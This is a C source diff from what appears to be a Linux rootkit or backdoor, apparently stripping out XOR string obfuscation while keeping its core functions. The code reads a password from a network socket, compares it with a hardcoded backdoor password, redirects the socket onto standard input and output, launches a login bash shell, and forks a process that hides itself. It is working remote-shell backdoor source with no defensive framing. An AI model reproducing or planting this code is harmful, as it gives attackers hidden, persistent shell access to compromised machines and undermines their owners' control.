@@ -1,30 +1,17 @@
-void ptext_spawn_shell(int sockfd){
+void spawn_shell(int sockfd){
     char *argv[3];
 
-    xor(bpath, BASH_PATH);
-    argv[0] = strdup(bpath);
-    clean(bpath);
-
-    xor(lflag, LOGIN_FLAG);
-    argv[1] = strdup(lflag);
-    clean(lflag);
-
+    argv[0] = strdup(BASH_PATH);
+    argv[1] = strdup(LOGIN_FLAG);
     argv[2] = NULL;
 
-    hook(CCHDIR,
-         CEXECVE);
-
-    xor(idir, INSTALL_DIR);
-    (void)call(CCHDIR, idir);     /* enter our installation directory */
-    clean(idir);
-
-    for(int i = 0; i < 3; i++) (void)dup2(sockfd, i);
+    for(int i = 0; i < 3; i++) dup2(sockfd, i);
+    chdir(INSTALL_DIR);
 #ifdef EXEC_PRE_SHELL
-    xor(pre_shell, PRE_SHELL);
-    (void)system(pre_shell);                     /* begin launching the shell */
-    clean(pre_shell);
+    system(PRE_SHELL);
 #endif
-    (void)call(CEXECVE, argv[0], argv, NULL);    /* environment vars already set by is_bdusr() */
+    hook(CEXECVE);
+    call(CEXECVE, argv[0], argv, NULL);    /* environment vars already set by is_bdusr() */
 }
 
 void backconnect(int method, int sockfd){
@@ -33,22 +20,18 @@ void backconnect(int method, int sockfd){
 
     if(method == METHOD_PLAINTEXT){
         hook(CREAD);
-        (void)call(CREAD, sockfd, tmp, sizeof(tmp) - 1);     /* read input from socket connection */
+        call(CREAD, sockfd, tmp, sizeof(tmp));     /* read input from socket connection */
         tmp[strlen(tmp) - 1] = '\0';
 
         /* spawn a regular shell with plaintext communications */
 #ifdef USE_CRYPT
-        xor(bd_pwd, BD_PWD);
-        got_pw = !strcmp(crypt(tmp, bd_pwd), bd_pwd);
-        clean(bd_pwd);
+        got_pw = !strncmp(BD_PWD, crypt(tmp, BD_PWD), strlen(BD_PWD));
 #else
-        got_pw = !xstrncmp(BD_PWD, tmp);
+        got_pw = !strncmp(BD_PWD, tmp, strlen(BD_PWD));
 #endif
 
-        if(got_pw){
-            memset(tmp, 0, strlen(tmp));
-            ptext_spawn_shell(sockfd);
-        }
+        memset(tmp, 0, strlen(tmp));
+        if(got_pw) spawn_shell(sockfd);
     }
 
 #ifdef ACCEPT_USE_SSL
@@ -59,21 +42,17 @@ void backconnect(int method, int sockfd){
         sockfd = SSL_get_fd(ssl);
 
         if(SSL_accept(ssl)){
-            SSL_read(ssl, tmp, sizeof(tmp) - 1);
+            s_read(tmp);
             tmp[strlen(tmp) - 1] = '\0';
 
 #ifdef USE_CRYPT
-            xor(bd_pwd, BD_PWD);
-            got_pw = !strcmp(crypt(tmp, bd_pwd), bd_pwd);
-            clean(bd_pwd);
+            got_pw = !strncmp(BD_PWD, crypt(tmp, BD_PWD), strlen(BD_PWD));
 #else
-            got_pw = !xstrncmp(BD_PWD, tmp);
+            got_pw = !strncmp(BD_PWD, tmp, strlen(BD_PWD));
 #endif
 
-            if(got_pw){
-                memset(tmp, 0, strlen(tmp));
-                cmd_loop(sockfd);
-            }
+            memset(tmp, 0, strlen(tmp));
+            if(got_pw) cmd_loop(sockfd);
             SSL_CTX_free(ctx);
         }
     }
@@ -82,11 +61,11 @@ void backconnect(int method, int sockfd){
 
 int drop_shell(int method, int sockfd){
     if(fork() == 0){
-        (void)fsync(sockfd);
-        (void)setsid();    /* start our own session */
-        hide_self();       /* hide this new process */
+        fsync(sockfd);
+        setsid();      /* start our own session */
+        hide_self();   /* hide this new process */
         backconnect(method, sockfd);
-        (void)close(sockfd);
+        close(sockfd);
         exit(0);
     }else{
         (void)close(sockfd);
